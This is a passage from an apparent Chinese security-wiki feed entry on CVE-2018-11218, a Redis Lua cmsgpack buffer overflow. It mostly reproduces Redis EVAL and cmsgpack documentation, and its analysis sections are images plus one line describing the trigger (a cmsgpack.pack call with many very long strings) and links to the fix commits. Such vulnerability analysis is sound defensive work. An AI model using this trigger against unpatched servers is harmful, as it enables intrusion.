plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p><strong>EVAL script numkeys key [key …] arg [arg …]</strong></p><blockquote><p>可用版本： &gt;= 2.6.0</p><p>时间复杂度： <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 和 EVALSHA 可以在 O(1) 复杂度内找到要被执行的脚本，其余的复杂度取决于执行的脚本本身。</p></blockquote><p>​        从 Redis 2.6.0 版本开始，通过内置的 Lua 解释器，可以使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令对 Lua 脚本进行求值。</p><p>​        <code>script</code> 参数是一段 Lua 5.1 脚本程序，它会被运行在 Redis 服务器上下文中，这段脚本不必(也不应该)定义为一个 Lua 函数。</p><p>​        <code>numkeys</code> 参数用于指定键名参数的个数。</p><p>​        键名参数 <code>key [key ...]</code> 从 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 的第三个参数开始算起，表示在脚本中所用到的那些 Redis 键(key)，这些键名参数可以在 Lua 中通过全局变量 <code>KEYS</code> 数组，用 <code>1</code> 为基址的形式访问( <code>KEYS[1]</code> ， <code>KEYS[2]</code> ，以此类推)。</p><p>​        在命令的最后，那些不是键名参数的附加参数 <code>arg [arg ...]</code> ，可以在 Lua 中通过全局变量 <code>ARGV</code> 数组访问，访问的形式和 <code>KEYS</code> 变量类似( <code>ARGV[1]</code> 、 <code>ARGV[2]</code> ，诸如此类)。</p><p>​        上面这几段长长的说明可以用一个简单的例子来概括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot; 2 key1 key2 first second</span><br><span class="line">1) &quot;key1&quot;</span><br><span class="line">2) &quot;key2&quot;</span><br><span class="line">3) &quot;first&quot;</span><br><span class="line">4) &quot;second&quot;</span><br></pre></td></tr></table></figure><p>​        其中 <code>&quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot;</code> 是被求值的 Lua 脚本，数字 <code>2</code> 指定了键名参数的数量， <code>key1</code> 和 <code>key2</code> 是键名参数，分别使用 <code>KEYS[1]</code> 和 <code>KEYS[2]</code> 访问，而最后的 <code>first</code> 和 <code>second</code> 则是附加参数，可以通过 <code>ARGV[1]</code> 和 <code>ARGV[2]</code> 访问它们。</p><p>​        在 Lua 脚本中，可以使用两个不同函数来执行 Redis 命令，它们分别是：</p><ul><li><p><code>redis.call()</code></p></li><li><p><code>redis.pcall()</code></p><p>​    这两个函数的唯一区别在于它们使用不同的方式处理执行命令所产生的错误，在后面的『错误处理』部分会讲到这一点。</p></li></ul><p><code>redis.call()</code> 和 <code>redis.pcall()</code> 两个函数的参数可以是任何格式良好(well formed)的 Redis 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return redis.call(&#x27;set&#x27;,&#x27;foo&#x27;,&#x27;bar&#x27;)&quot; 0</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>​        需要注意的是，上面这段脚本的确实现了将键 <code>foo</code> 的值设为 <code>bar</code> 的目的，但是，它违反了 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令的语义，因为脚本里使用的所有键都应该由 <code>KEYS</code> 数组来传递，就像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return redis.call(&#x27;set&#x27;,KEYS[1],&#x27;bar&#x27;)&quot; 1 foo</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>​        要求使用正确的形式来传递键(key)是有原因的，因为不仅仅是 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 这个命令，所有的 Redis 命令，在执行之前都会被分析，籍此来确定命令会对哪些键进行操作。</p><p>​        因此，对于 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令来说，必须使用正确的形式来传递键，才能确保分析工作正确地执行。除此之外，使用正确的形式来传递键还有很多其他好处，它的一个特别重要的用途就是确保 Redis 集群可以将你的请求发送到正确的集群节点。(对 Redis 集群的工作还在进行当中，但是脚本功能被设计成可以与集群功能保持兼容。)不过，这条规矩并不是强制性的，从而使得用户有机会滥用(abuse) Redis 单实例配置(single instance configuration)，代价是这样写出的脚本不能被 Redis 集群所兼容。</p><p><strong>在 Lua 数据类型和 Redis 数据类型之间转换</strong></p><p>​        当 Lua 通过 <code>call()</code> 或 <code>pcall()</code> 函数执行 Redis 命令的时候，命令的返回值会被转换成 Lua 数据结构。同样地，当 Lua 脚本在 Redis 内置的解释器里运行时，Lua 脚本的返回值也会被转换成 Redis 协议(protocol)，然后由 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 将值返回给客户端。</p><p>​        数据类型之间的转换遵循这样一个设计原则：如果将一个 Redis 值转换成 Lua 值，之后再将转换所得的 Lua 值转换回 Redis 值，那么这个转换所得的 Redis 值应该和最初时的 Redis 值一样。</p><p>​        换句话说， Lua 类型和 Redis 类型之间存在着一一对应的转换关系。</p><p>​    以下列出的是详细的转换规则：</p><p>​    从 Redis 转换到 Lua ：</p><ul><li>Redis integer reply -&gt; Lua number / Redis 整数转换成 Lua 数字</li><li>Redis bulk reply -&gt; Lua string / Redis bulk 回复转换成 Lua 字符串</li><li>Redis multi bulk reply -&gt; Lua table (may have other Redis data types nested) / Redis 多条 bulk 回复转换成 Lua 表，表内可能有其他别的 Redis 数据类型</li><li>Redis status reply -&gt; Lua table with a single ok field containing the status / Redis 状态回复转换成 Lua 表，表内的 <code>ok</code> 域包含了状态信息</li><li>Redis error reply -&gt; Lua table with a single err field containing the error / Redis 错误回复转换成 Lua 表，表内的 <code>err</code> 域包含了错误信息</li><li>Redis Nil bulk reply and Nil multi bulk reply -&gt; Lua false boolean type / Redis 的 Nil 回复和 Nil 多条回复转换成 Lua 的布尔值 <code>false</code></li></ul><p>从 Lua 转换到 Redis：</p><ul><li>Lua number -&gt; Redis integer reply / Lua 数字转换成 Redis 整数</li><li>Lua string -&gt; Redis bulk reply / Lua 字符串转换成 Redis bulk 回复</li><li>Lua table (array) -&gt; Redis multi bulk reply / Lua 表(数组)转换成 Redis 多条 bulk 回复</li><li>Lua table with a single ok field -&gt; Redis status reply / 一个带单个 <code>ok</code> 域的 Lua 表，转换成 Redis 状态回复</li><li>Lua table with a single err field -&gt; Redis error reply / 一个带单个 <code>err</code> 域的 Lua 表，转换成 Redis 错误回复</li><li>Lua boolean false -&gt; Redis Nil bulk reply / Lua 的布尔值 <code>false</code> 转换成 Redis 的 Nil bulk 回复</li></ul><p>从 Lua 转换到 Redis 有一条额外的规则，这条规则没有和它对应的从 Redis 转换到 Lua 的规则：</p><ul><li>Lua boolean true -&gt; Redis integer reply with value of 1 / Lua 布尔值 <code>true</code> 转换成 Redis 整数回复中的 <code>1</code></li></ul><p>以下是几个类型转换的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return 10&quot; 0</span><br><span class="line">(integer) 10</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return &#123;1,2,&#123;3,&#x27;Hello World!&#x27;&#125;&#125;&quot; 0</span><br><span class="line">1) (integer) 1</span><br><span class="line">2) (integer) 2</span><br><span class="line">3) 1) (integer) 3</span><br><span class="line">   2) &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0</span><br><span class="line">&quot;bar&quot;</span><br></pre></td></tr></table></figure><p>​        在上面的三个代码示例里，前两个演示了如何将 Lua 值转换成 Redis 值，最后一个例子更复杂一些，它演示了一个将 Redis 值转换成 Lua 值，然后再将 Lua 值转换成 Redis 值的类型转过程。</p><p><strong>脚本的原子性</strong></p><p>​        Redis 使用单个 Lua 解释器去运行所有脚本，并且， Redis 也保证脚本会以原子性(atomic)的方式执行：当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。这和使用 <a href="http://redisdoc.com/transaction/multi.html#multi">MULTI</a> / <a href="http://redisdoc.com/transaction/exec.html#exec">EXEC</a> 包围的事务很类似。在其他别的客户端看来，脚本的效果(effect)要么是不可见的(not visible)，要么就是已完成的(already completed)。</p><p>​        另一方面，这也意味着，执行一个运行缓慢的脚本并不是一个好主意。写一个跑得很快很顺溜的脚本并不难，因为脚本的运行开销(overhead)非常少，但是当你不得不使用一些跑得比较慢的脚本时，请小心，因为当这些蜗牛脚本在慢吞吞地运行的时候，其他客户端会因为服务器正忙而无法执行命令。</p><p><strong>错误处理</strong></p><p>​        前面的命令介绍部分说过， <code>redis.call()</code> 和 <code>redis.pcall()</code> 的唯一区别在于它们对错误处理的不同。</p><p>​        当 <code>redis.call()</code> 在执行命令的过程中发生错误时，脚本会停止执行，并返回一个脚本错误，错误的输出信息会说明错误造成的原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis&gt; lpush foo a</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br><span class="line">redis&gt; eval &quot;return redis.call(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0</span><br><span class="line">(error) ERR Error running script (call to f_282297a0228f48cd3fc6a55de6316f31422f5d17): ERR Operation against a key holding the wrong kind of value</span><br></pre></td></tr></table></figure><p>​        和 <code>redis.call()</code> 不同， <code>redis.pcall()</code> 出错时并不引发(raise)错误，而是返回一个带 <code>err</code> 域的 Lua 表(table)，用于表示错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; EVAL &quot;return redis.pcall(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0</span><br><span class="line">(error) ERR Operation against a key holding the wrong kind of value</span><br></pre></td></tr></table></figure><p><strong>带宽和 EVALSHA</strong></p><p>​        <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令要求你在每次执行脚本的时候都发送一次脚本主体(script body)。Redis 有一个内部的缓存机制，因此它不会每次都重新编译脚本，不过在很多场合，付出无谓的带宽来传送脚本主体并不是最佳选择。</p><p>为了减少带宽的消耗， Redis 实现了 EVALSHA 命令，它的作用和 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 一样，都用于对脚本求值，但它接受的第一个参数不是脚本，而是脚本的 SHA1 校验和(sum)。</p><p>EVALSHA 命令的表现如下：</p><ul><li>如果服务器还记得给定的 SHA1 校验和所指定的脚本，那么执行这个脚本</li><li>如果服务器不记得给定的 SHA1 校验和所指定的脚本，那么它返回一个特殊的错误，提醒用户使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 代替 EVALSHA</li></ul><p>以下是示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; set foo bar</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0</span><br><span class="line">&quot;bar&quot;</span><br><span class="line"></span><br><span class="line">&gt; evalsha 6b1bf486c81ceb7edf3c093f4c48582e38c0e791 0</span><br><span class="line">&quot;bar&quot;</span><br><span class="line"></span><br><span class="line">&gt; evalsha ffffffffffffffffffffffffffffffffffffffff 0</span><br><span class="line">(error) `NOSCRIPT` No matching script. Please use [EVAL](/commands/eval).</span><br></pre></td></tr></table></figure><p>​        客户端库的底层实现可以一直乐观地使用 EVALSHA 来代替 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> ，并期望着要使用的脚本已经保存在服务器上了，只有当 <code>NOSCRIPT</code> 错误发生时，才使用 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令重新发送脚本，这样就可以最大限度地节省带宽。</p><p>​        这也说明了执行 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令时，使用正确的格式来传递键名参数和附加参数的重要性：因为如果将参数硬写在脚本中，那么每次当参数改变的时候，都要重新发送脚本，即使脚本的主体并没有改变，相反，通过使用正确的格式来传递键名参数和附加参数，就可以在脚本主体不变的情况下，直接使用 EVALSHA 命令对脚本进行复用，免去了无谓的带宽消耗。</p><p><strong>脚本缓存</strong></p><p>​        Redis 保证所有被运行过的脚本都会被永久保存在脚本缓存当中，这意味着，当 <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令在一个 Redis 实例上成功执行某个脚本之后，随后针对这个脚本的所有 EVALSHA 命令都会成功执行。</p><p>​        刷新脚本缓存的唯一办法是显式地调用 <code>SCRIPT FLUSH</code> 命令，这个命令会清空运行过的所有脚本的缓存。通常只有在云计算环境中，Redis 实例被改作其他客户或者别的应用程序的实例时，才会执行这个命令。</p><p>​        缓存可以长时间储存而不产生内存问题的原因是，它们的体积非常小，而且数量也非常少，即使脚本在概念上类似于实现一个新命令，即使在一个大规模的程序里有成百上千的脚本，即使这些脚本会经常修改，即便如此，储存这些脚本的内存仍然是微不足道的。</p><p>​        事实上，用户会发现 Redis 不移除缓存中的脚本实际上是一个好主意。比如说，对于一个和 Redis 保持持久化链接(persistent connection)的程序来说，它可以确信，执行过一次的脚本会一直保留在内存当中，因此它可以在流水线中使用 EVALSHA 命令而不必担心因为找不到所需的脚本而产生错误(稍候我们会看到在流水线中执行脚本的相关问题)。</p><p><strong>SCRIPT 命令</strong></p><p>Redis 提供了以下几个 SCRIPT 命令，用于对脚本子系统(scripting subsystem)进行控制：</p><ul><li><a href="http://redisdoc.com/script/script_flush.html#script-flush">SCRIPT FLUSH</a> ：清除所有脚本缓存</li><li>[SCRIPT EXISTS sha1 <a href="http://redisdoc.com/script/script_exists.html#script-exists">sha1 …]</a> ：根据给定的脚本校验和，检查指定的脚本是否存在于脚本缓存</li><li><a href="http://redisdoc.com/script/script_load.html#script-load">SCRIPT LOAD script</a> ：将一个脚本装入脚本缓存，但并不立即运行它</li><li><a href="http://redisdoc.com/script/script_kill.html#script-kill">SCRIPT KILL</a> ：杀死当前正在运行的脚本</li></ul><p><strong>纯函数脚本</strong></p><p>在编写脚本方面，一个重要的要求就是，脚本应该被写成纯函数(pure function)。</p><p>也就是说，脚本应该具有以下属性：</p><ul><li>对于同样的数据集输入，给定相同的参数，脚本执行的 Redis 写命令总是相同的。脚本执行的操作不能依赖于任何隐藏(非显式)数据，不能依赖于脚本在执行过程中、或脚本在不同执行时期之间可能变更的状态，并且它也不能依赖于任何来自 I/O 设备的外部输入。</li></ul><p>使用系统时间(system time)，调用像 <a href="http://redisdoc.com/database/randomkey.html#randomkey">RANDOMKEY</a> 那样的随机命令，或者使用 Lua 的随机数生成器，类似以上的这些操作，都会造成脚本的求值无法每次都得出同样的结果。</p><p>为了确保脚本符合上面所说的属性， Redis 做了以下工作：</p><ul><li>Lua 没有访问系统时间或者其他内部状态的命令</li><li>Redis 会返回一个错误，阻止这样的脚本运行： 这些脚本在执行随机命令之后(比如 <a href="http://redisdoc.com/database/randomkey.html#randomkey">RANDOMKEY</a> 、 [SRANDMEMBER key <a href="http://redisdoc.com/set/srandmember.html#srandmember">count]</a> 或 <a href="http://redisdoc.com/client_and_server/time.html#time">TIME</a> 等)，还会执行可以修改数据集的 Redis 命令。如果脚本只是执行只读操作，那么就没有这一限制。注意，随机命令并不一定就指那些带 RAND 字眼的命令，任何带有非确定性的命令都会被认为是随机命令，比如 <a href="http://redisdoc.com/client_and_server/time.html#time">TIME</a> 命令就是这方面的一个很好的例子。</li><li>每当从 Lua 脚本中调用那些返回无序元素的命令时，执行命令所得的数据在返回给 Lua 之前会先执行一个静默(slient)的字典序排序(<a href="http://en.wikipedia.org/wiki/Lexicographical_order">lexicographical sorting</a>)。举个例子，因为 Redis 的 Set 保存的是无序的元素，所以在 Redis 命令行客户端中直接执行 <a href="http://redisdoc.com/set/smembers.html#smembers">SMEMBERS key</a> ，返回的元素是无序的，但是，假如在脚本中执行 <code>redis.call(&quot;smembers&quot;, KEYS[1])</code> ，那么返回的总是排过序的元素。</li><li>对 Lua 的伪随机数生成函数 <code>math.random</code> 和 <code>math.randomseed</code> 进行修改，使得每次在运行新脚本的时候，总是拥有同样的 seed 值。这意味着，每次运行脚本时，只要不使用 <code>math.randomseed</code> ，那么 <code>math.random</code> 产生的随机数序列总是相同的。</li></ul><p>尽管有那么多的限制，但用户还是可以用一个简单的技巧写出带随机行为的脚本(如果他们需要的话)。</p><p>假设现在我们要编写一个 Redis 脚本，这个脚本从列表中弹出 N 个随机数。一个 Ruby 写的例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;rubygems&#x27;</span><br><span class="line">require &#x27;redis&#x27;</span><br><span class="line"></span><br><span class="line">r = Redis.new</span><br><span class="line"></span><br><span class="line">RandomPushScript = &lt;&lt;EOF</span><br><span class="line">    local i = tonumber(ARGV[1])</span><br><span class="line">    local res</span><br><span class="line">    while (i &gt; 0) do</span><br><span class="line">        res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random())</span><br><span class="line">        i = i-1</span><br><span class="line">    end</span><br><span class="line">    return res</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">r.del(:mylist)</span><br><span class="line">puts r.eval(RandomPushScript,[:mylist],[10,rand(2**32)])</span><br></pre></td></tr></table></figure><p>这个程序每次运行都会生成带有以下元素的列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; lrange mylist 0 -1</span><br><span class="line">1) &quot;0.74509509873814&quot;</span><br><span class="line">2) &quot;0.87390407681181&quot;</span><br><span class="line">3) &quot;0.36876626981831&quot;</span><br><span class="line">4) &quot;0.6921941534114&quot;</span><br><span class="line">5) &quot;0.7857992587545&quot;</span><br><span class="line">6) &quot;0.57730350670279&quot;</span><br><span class="line">7) &quot;0.87046522734243&quot;</span><br><span class="line">8) &quot;0.09637165539729&quot;</span><br><span class="line">9) &quot;0.74990198051087&quot;</span><br><span class="line">10) &quot;0.17082803611217&quot;</span><br></pre></td></tr></table></figure><p>上面的 Ruby 程序每次都只生成同样的列表，用途并不是太大。那么，该怎样修改这个脚本，使得它仍然是一个纯函数(符合 Redis 的要求)，但是每次调用都可以产生不同的随机元素呢？</p><p>一个简单的办法是，为脚本添加一个额外的参数，让这个参数作为 Lua 的随机数生成器的 seed 值，这样的话，只要给脚本传入不同的 seed ，脚本就会生成不同的列表元素。</p><p>以下是修改后的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RandomPushScript = &lt;&lt;EOF</span><br><span class="line">    local i = tonumber(ARGV[1])</span><br><span class="line">    local res</span><br><span class="line">    math.randomseed(tonumber(ARGV[2]))</span><br><span class="line">    while (i &gt; 0) do</span><br><span class="line">        res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random())</span><br><span class="line">        i = i-1</span><br><span class="line">    end</span><br><span class="line">    return res</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">r.del(:mylist)</span><br><span class="line">puts r.eval(RandomPushScript,1,:mylist,10,rand(2**32))</span><br></pre></td></tr></table></figure><p>尽管对于同样的 seed ，上面的脚本产生的列表元素是一样的(因为它是一个纯函数)，但是只要每次在执行脚本的时候传入不同的 seed ，我们就可以得到带有不同随机元素的列表。</p><p>Seed 会在复制(replication link)和写 AOF 文件时作为一个参数来传播，保证在载入 AOF 文件或附属节点(slave)处理脚本时， seed 仍然可以及时得到更新。</p><p>注意，Redis 实现保证 <code>math.random</code> 和 <code>math.randomseed</code> 的输出和运行 Redis 的系统架构无关，无论是 32 位还是 64 位系统，无论是小端(little endian)还是大端(big endian)系统，这两个函数的输出总是相同的。</p><p><strong>全局变量保护</strong></p><p>​        为了防止不必要的数据泄漏进 Lua 环境， Redis 脚本不允许创建全局变量。如果一个脚本需要在多次执行之间维持某种状态，它应该使用 Redis key 来进行状态保存。</p><p>​        企图在脚本中访问一个全局变量(不论这个变量是否存在)将引起脚本停止， <a href="http://redisdoc.com/script/eval.html#eval">EVAL</a> 命令会返回一个错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; eval &#x27;a=10&#x27; 0</span><br><span class="line">(error) ERR Error running script (call to f_933044db579a2f8fd45d8065f04a8d0249383e57): user_script:1: Script attempted to create global variable &#x27;a&#x27;</span><br></pre></td></tr></table></figure><p>​        Lua 的 debug 工具，或者其他设施，比如打印（alter）用于实现全局保护的 meta table ，都可以用于实现全局变量保护。</p><p>​        实现全局变量保护并不难，不过有时候还是会不小心而为之。一旦用户在脚本中混入了 Lua 全局状态，那么 AOF 持久化和复制（replication）都会无法保证，所以，请不要使用全局变量。</p><p>​        避免引入全局变量的一个诀窍是：将脚本中用到的所有变量都使用 <code>local</code> 关键字定义为局部变量。</p><p><strong>库</strong></p><p>Redis 内置的 Lua 解释器加载了以下 Lua 库：</p><ul><li><p><code>base</code></p></li><li><p><code>table</code></p></li><li><p><code>string</code></p></li><li><p><code>math</code></p></li><li><p><code>debug</code></p></li><li><p><code>cjson</code></p></li><li><p><code>cmsgpack</code></p><p>其中 <code>cjson</code> 库可以让 Lua 以非常快的速度处理 JSON 数据，除此之外，其他别的都是 Lua 的标准库。</p><p>每个 Redis 实例都保证会加载上面列举的库，从而确保每个 Redis 脚本的运行环境都是相同的。</p></li></ul><p><strong>cmsgpack</strong></p><p>​        Lua-cmsgpack是<a href="http://msgpack.org/">MessagePack的</a>一个实现，它是一个Lua 5.1 / 5.2 / 5.3在一个没有外部依赖性的自包含C文件中的绑定。</p><p>该库是根据BSD两条款许可获得许可的开源软件。</p><p><strong>用法</strong></p><p>导出的API非常简单，包含四个功能：</p><p>基本API：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msgpack = cmsgpack.pack(lua_object1, lua_object2, ..., lua_objectN)</span><br><span class="line">lua_object1, lua_object2, ..., lua_objectN = cmsgpack.unpack(msgpack)</span><br></pre></td></tr></table></figure><p>详细的API使您可以更好地控制解压缩多个值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resume_offset, lua_object1 = cmsgpack.unpack_one(msgpack)</span><br><span class="line">resume_offset1, lua_object2 = cmsgpack.unpack_one(msgpack, resume_offset)</span><br><span class="line">...</span><br><span class="line">-1, lua_objectN = cmsgpack.unpack_one(msgpack, resume_offset_previous)</span><br><span class="line"></span><br><span class="line">resume_offset, lua_object1, lua_object2 = cmsgpack.unpack_limit(msgpack, 2)</span><br><span class="line">resume_offset2, lua_object3 = cmsgpack.unpack_limit(msgpack, 1, resume_offset1)</span><br></pre></td></tr></table></figure><p>作用：</p><ul><li><p><code>pack(arg1, arg2, ..., argn)</code>-将任意数量的lua对象打包到一个msgpack流中。返回：msgpack</p></li><li><p><code>unpack(msgpack)</code>-将msgpack中的所有对象解压缩为单独的返回值。返回：object1，object2，…，objectN</p></li><li><p><code>unpack_one(msgpack); unpack_one(msgpack, offset)</code>-偏移后解压缩第一个对象。返回：偏移量，对象</p></li><li><p><code>unpack_limit(msgpack, limit); unpack_limit(msgpack, limit, offset)</code>-解压缩第一个<code>limit</code>对象并返回：offset，object1，objet2，…，objectN（上限，但如果没有很多要解压缩的对象，则返回的数量可能少于限制）</p><p>​    当您使用<code>unpack_one</code>或到达输入流的末尾时，将返回<code>unpack_limit</code>的偏移量<code>-1</code>。</p><p>​    你可能会<code>require &quot;msgpack&quot;</code>也可能会<code>require &quot;msgpack.safe&quot;</code>。安全版本将错误返回为（nil，errstring）。</p><p>​    但是，由于Lua数字和表类型的性质，必须很好地理解库的一些行为，以避免出现问题：</p></li><li><p>仅当<em>所有</em>键均由以1开头，以N结尾，不带孔且没有其他非数字键的增量整数组成时，表才转换为MessagePack数组类型。所有其他表都将转换为映射。</p></li><li><p>空表总是转换为MessagePack数组，其理由是空列表比空映射（通常用于表示具有字段的对象）更为常见。</p></li><li><p>如果floor（number）== number，则Lua数字将转换为整数类型，否则将其转换为MessagePack浮点或双精度值。</p></li><li><p>当Lua数转换为float或double时，如果与double表示相比不损失精度，则首选前者。</p></li><li><p>将MessagePack大整数（64位）转换为Lua编号时，结果编号可能不会代表原始编号，而只是一个近似值。这是不可避免的，因为Lua数值类型通常是双精度浮点类型。</p></li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>​        deps/lua/src/lua_cmsgpack.c</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        发送cmsgpack.pack调用，并设置超多的超长字符串参数</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/redis/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3">https://github.com/redis/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3</a></li><li><a href="https://github.com/redis/redis/commit/90b6337c155aa0330143f5b0a0af1d430271d400">https://github.com/redis/redis/commit/90b6337c155aa0330143f5b0a0af1d430271d400</a></li><li><a href="https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a">https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a</a></li><li><a href="https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035">https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035</a></li><li><a href="http://antirez.com/news/119">http://antirez.com/news/119</a></li><li><a href="https://github.com/redis/redis/issues/5017">https://github.com/redis/redis/issues/5017</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
